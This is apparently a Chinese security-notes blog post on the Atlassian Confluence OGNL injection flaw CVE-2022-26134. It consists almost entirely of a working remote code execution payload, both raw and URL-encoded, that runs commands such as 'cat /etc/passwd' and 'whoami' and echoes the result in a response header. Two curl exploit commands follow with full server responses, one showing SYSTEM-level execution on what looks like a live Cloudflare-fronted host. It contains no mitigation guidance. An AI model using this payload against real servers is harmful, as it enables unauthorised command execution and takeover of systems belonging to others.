---
title: Atlassian_Confluence-CVE-2022-26134.md
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2022-06-06 09:19:25
top:
tags:
layout:
---
编写进度
- [x] 


# Atlassian_Confluence-CVE-2022-26134
测试payload
```bash
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("cat /etc/passwd").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/

```

## exp 
```bash
curl -I  -k  "http://{host}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
HTTP/1.1 302
X-ASEN: SEN-16357695
X-Confluence-Request-Time: 1654478089003
Set-Cookie: JSESSIONID=A34182817EBFE6F7FA068AFB7582E98E; Path=/; HttpOnly
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'
X-Cmd-Response: confluence
Location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action&permissionViolation=true
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Mon, 06 Jun 2022 01:14:49 GMT 
```
## example
```bash
curl -I -k "https://{host}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
HTTP/2 302
date: Mon, 06 Jun 2022 01:27:10 GMT
content-type: text/html;charset=UTF-8
cache-control: private
expires: Thu, 01 Jan 1970 02:00:00 IST
x-asen: SEN-15222703
x-confluence-request-time: 1654478830348
x-confluence-cluster-node: 31b036c8
p3p: CP="IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT"
set-cookie: JSESSIONID=18114A6EC984E7571933004E790DF93F; Path=/; Secure; HttpOnly
x-xss-protection: 1; mode=block
x-content-type-options: nosniff
x-cmd-response: nt authority\system
location: /login.action?os_destination=%2F%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D%2Findex.action&permissionViolation=true
cf-cache-status: DYNAMIC
expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
server: cloudflare
cf-ray: 716d5d2b3f2bf8a7-NRT
alt-svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400
```


